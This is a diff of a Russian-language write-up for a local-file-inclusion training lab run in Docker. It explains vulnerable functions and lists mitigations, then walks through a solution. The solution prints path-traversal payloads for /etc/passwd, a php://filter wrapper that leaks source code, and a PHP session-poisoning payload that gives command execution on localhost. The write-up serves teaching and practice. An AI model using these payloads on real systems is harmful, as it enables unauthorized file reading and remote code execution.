@@ -4,10 +4,10 @@
 
 Функции в разных языках, которые могут приводить к LFI:
 
-- **PHP**: include() / include\_once() , file\_get\_contents() , fopen() / file()![](./img/Aspose.Words.341f10a6-e995-4500-83c1-896da81956a4.001.png)
-- **Java**: import![](./img/Aspose.Words.341f10a6-e995-4500-83c1-896da81956a4.002.png)
-- **.NET**: @Html.RemotePartial() , include
-- **NodeJS**: res.render()
+- **PHP**: `include()` / `include\_once()` , `file\_get\_contents()`, `fopen() / file()`
+- **Java**: `import`
+- **.NET**: `@Html.RemotePartial()` , `include`
+- **NodeJS**: `res.render()`
 
   Кроме того, если web-сервер собирает какую-то информацию, например в /etc/apache2/access.log(в случае apache) или /var/log/nginx/access.log(в случае с nginx), то при наличии LFI, можно выставить в качестве значения заголовка User-Agent, какой- то код(в большинстве случаев на php), и включить log файл в следующем запросе. Если web сервер, настроен на обработку php файлов из директории, в которой находятся log файлы, то код выполнится.
 
@@ -17,16 +17,16 @@
 
 - В случае с включением каких-то определённых файлов, можно использовать функцию basename(), которая принимает в качестве параметра любой путь, а возвращает название файла с его расширением. Конечный код должен выглядеть так:
 
-include basedir($\_GET['language'])![](./img/Aspose.Words.341f10a6-e995-4500-83c1-896da81956a4.003.png)
+`include basedir($\_GET['language'])`
 
 - Необходимо выставлять значение таких переменных, как allow\_url\_fopen или allow\_url\_include на off, так как большинство из них позволяет использовать обёртки.
 - Можно использовать переменную open\_basedir, которая не позволит злоумышленнику получить доступ к файлам, находящимся вне директории, прописанной в качестве значения данной переменной.
 - Делать рекурсивную проверку на наличие последовательностей типа '../' или '..\'
-
-while (strpos($param\_value, '../') !== false) {![](./img/Aspose.Words.341f10a6-e995-4500-83c1-896da81956a4.004.png)
-
-$param\_value = str\_replace('../', '', $param\_value); }
-
+```php
+while (strpos($param\_value, '../') !== false) {
+  $param\_value = str\_replace('../', '', $param\_value); 
+}
+```
 - Использование WAF
 
 **Запуск приложения**
@@ -36,9 +36,9 @@ $param\_value = str\_replace('../', '', $param\_value); }
 - скачать репозиторий
 - зайти в директорию с файлом docker-compose.yaml
 - в случае, если не нужно менять параметры, зайти из терминала в директорию с конфигурационными файлами и прописать:
-
-docker-compose up![](./img/Aspose.Words.341f10a6-e995-4500-83c1-896da81956a4.005.png)
-
+```shell
+docker-compose up
+```
 - в файле docker-compose.yaml можно поменять значение порта с 8090 на любой другой
 - в файле .env можно поменять значение флага на желаемое
 
@@ -62,19 +62,18 @@ $path\_to\_lang\_file = $\_GET['lang']; $\_SESSION[![ref1]'language'] = $path\_t
 **Решение**
 
 Первое, что можно сделать - это попытаться найти path traversal в GET параметре, передавая в качестве значения следующие полезные нагрузки:
-
-../../../../../../../../../../../../etc/passwd ..././..././..././..././..././..././..././etc/passwd ....//....//....//....//....//....//....//....//etc/passwd %2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2![](./img/Aspose.Words.341f10a6-e995-4500-83c1-896da81956a4.007.png) E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd %252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E% 252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd![](./img/Aspose.Words.341f10a6-e995-4500-83c1-896da81956a4.008.png)
-
+```http
+../../../../../../../../../../../../etc/passwd ..././..././..././..././..././..././..././etc/passwd ....//....//....//....//....//....//....//....//etc/passwd %2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2![](./img/Aspose.Words.341f10a6-e995-4500-83c1-896da81956a4.007.png) E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd %252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E% 252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd
+```
 В результате будет выводиться следующее:
-
 ![](./img/Aspose.Words.341f10a6-e995-4500-83c1-896da81956a4.009.jpeg)
 
 Это может навести на мысль о том, что значение заголовка фильтруется.
 
 Можно попытаться использовать php wrappers для получения index.php в base64:
-
-php://filter/convert.base64-encode/resource=./index.php![](./img/Aspose.Words.341f10a6-e995-4500-83c1-896da81956a4.010.png)
-
+```php
+php://filter/convert.base64-encode/resource=./index.php
+```
 ![](./img/Aspose.Words.341f10a6-e995-4500-83c1-896da81956a4.011.jpeg)
 
 Получаем содержимое страницы в base64.
@@ -98,9 +97,10 @@ php://filter/convert.base64-encode/resource=./index.php![](./img/Aspose.Words.34
   ![](./img/Aspose.Words.341f10a6-e995-4500-83c1-896da81956a4.014.jpeg)
 
   Полезная нагрузка в данном случае будет следующая:
-
-http://localhost:8090/index.php?lang=<?php system($\_GET['cmd']);?> ![ref1]http://localhost:8090/index.php?lang=/tmp/sess\_<имя-cookie>?cmd=url-encode(команда)
-
+```http
+http://localhost:8090/index.php?lang=<?php system($\_GET['cmd']);?>
+http://localhost:8090/index.php?lang=/tmp/sess\_<имя-cookie>?cmd=url-encode(команда)
+```
 ![](./img/Aspose.Words.341f10a6-e995-4500-83c1-896da81956a4.015.jpeg)
 
 Видим содержимое корня и замечаем файлик flag.txt
